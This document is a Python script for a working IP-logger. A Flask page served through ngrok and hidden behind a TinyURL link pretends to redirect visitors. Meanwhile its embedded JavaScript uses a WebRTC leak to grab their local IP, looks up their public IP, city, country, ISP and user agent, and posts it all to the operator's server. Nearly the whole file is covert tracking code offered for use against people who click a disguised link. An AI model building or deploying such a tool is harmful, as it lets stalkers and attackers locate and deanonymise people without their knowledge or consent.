import logging
logging.getLogger('werkzeug').disabled = True
logging.getLogger().setLevel(logging.CRITICAL)
from flask import Flask, request, cli
from flask_cors import CORS
cli.show_server_banner = lambda *args: None
from pyngrok import ngrok
import requests
import sys
import argparse
import socket

parser = argparse.ArgumentParser(formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=200))
parser.add_argument("-t", "--token", help="Ngrok authtoken", required=True)
parser.add_argument("-r", "--redirect", help="Url to redirect to after ip log", required=True)
if len(sys.argv)==1:
    parser.print_help(sys.stderr)
    sys.exit(1)
args = parser.parse_args()

ngrok_token, redirect_url = args.token, args.redirect

PORT = 5000

logger_html = r"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirect</title>
</head>
<body>
    <p>Redirecting you to |TITLE|</p>
    <script>
        function getLocalIP() {
            return new Promise(function(resolve, reject) {
                var RTCPeerConnection = /*window.RTCPeerConnection ||*/ window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
                if (!RTCPeerConnection) {
                    reject('Your browser does not support this API');
                }
                var rtc = new RTCPeerConnection({iceServers:[]});
                var addrs = {};
                addrs["0.0.0.0"] = false;
                function grepSDP(sdp) {
                    var hosts = [];
                    var finalIP = '';
                    sdp.split('\r\n').forEach(function (line) {
                        if (~line.indexOf("a=candidate")) {
                            var parts = line.split(' '),
                            addr = parts[4],
                            type = parts[7];
                            if (type === 'host') {
                                finalIP = addr;
                            }
                        } else if (~line.indexOf("c=")) {
                            var parts = line.split(' '),
                            addr = parts[2];
                            finalIP = addr;
                        }
                    });
                    return finalIP;
                }
                if (1 || window.mozRTCPeerConnection) {
                    rtc.createDataChannel('', {reliable:false});
                };
                rtc.onicecandidate = function (evt) {
                    if (evt.candidate) {
                        var addr = grepSDP("a="+evt.candidate.candidate);
                        resolve(addr);
                    }
                };
                rtc.createOffer(function (offerDesc) {
                    rtc.setLocalDescription(offerDesc);
                }, function (e) { console.warn("offer failed", e); });
            });
        }

        function sendLog(localip) {
            const useragent = navigator.userAgent;
            fetch("https://ipapi.co/json/")
            .then(response => response.json())
            .then(ipdata => {
                console.log(localip);
                fetch("|URL|/log", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        ipdata: ipdata,
                        localip: localip,
                        useragent: useragent
                    })
                })
                .then(response => response.json())
                .then(data => {
                    location.replace("|REDIRECT|")
                });
            });
        }
        getLocalIP().then(localip => sendLog(localip)).catch(e => sendLog("unknown"));
    </script>
</body>
</html>
"""

ngrok.set_auth_token(ngrok_token)
ngrok_tunnel = ngrok.connect(PORT)
url = ngrok_tunnel.public_url
short_url = requests.get(f"https://tinyurl.com/api-create.php?url={url}").text

print(f"[!] Ip Logger is running on: {short_url}")

def replace_all(replace_list, text):
    for key in replace_list:
        text = text.replace(key, replace_list[key])
    return text

try:
    app = Flask(__name__)
    CORS(app)

    @app.route("/")
    def index():
        replace_list = {
            "|URL|": url,
            "|REDIRECT|": redirect_url,
            "|TITLE|": redirect_url
        }
        return replace_all(replace_list, logger_html)

    @app.route("/log", methods=["POST"])
    def log():
        data = request.get_json()
        try:
            localip = socket.gethostbyname(data["localip"])
        except:
            localip = data["localip"]
        print("[+] Ip Logged:")
        print(f"   - Local Ip: {localip},\n   - Public Ip: {data['ipdata']['ip']},\n   - City: {data['ipdata']['city']},\n   - Country: {data['ipdata']['country_name']},\n   - Provider: {data['ipdata']['org']},\n   - UserAgent: {data['useragent']}")
        return {"error": False, "message": "done"}

    app.run(port=PORT)
finally:
    print("[!] Ip Logger stopped.")